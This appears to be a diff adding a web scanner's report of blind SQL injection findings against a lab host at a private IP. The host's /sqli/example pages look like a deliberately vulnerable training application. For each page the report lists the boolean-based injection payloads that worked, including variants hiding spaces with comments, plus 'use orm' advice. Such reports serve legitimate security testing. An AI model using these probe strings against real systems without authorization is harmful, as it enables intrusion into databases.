@@ -1,0 +1,87 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'64869'='64869
+'	and	'61918'='61918
+'	or	93140=93140#
+'	and	'56854'='56855
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'64869'='64869
+'	and	'61918'='61918
+'	or	93140=93140#
+'	and	'56854'='56855
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	79399=79399
+	and	22854=22854
+	or	18681=18681#
+	and	81355=81356
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	79399=79399
+	and	22854=22854
+	or	18681=18681#
+	and	81355=81356
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '/**/and/**/'65923'='65923
+'/**/and/**/'69912'='69912
+'/**/or/**/19580=19580#
+'/**/and/**/'91368'='91369
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	79399=79399
+	and	22854=22854
+	or	18681=18681#
+	and	81355=81356
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 
+and
+82989=82989
+
+and
+1076=1076
+
+or
+83154=83154#
+
+and
+39723=39724
+Advice: use orm
+Database: unknown
+---
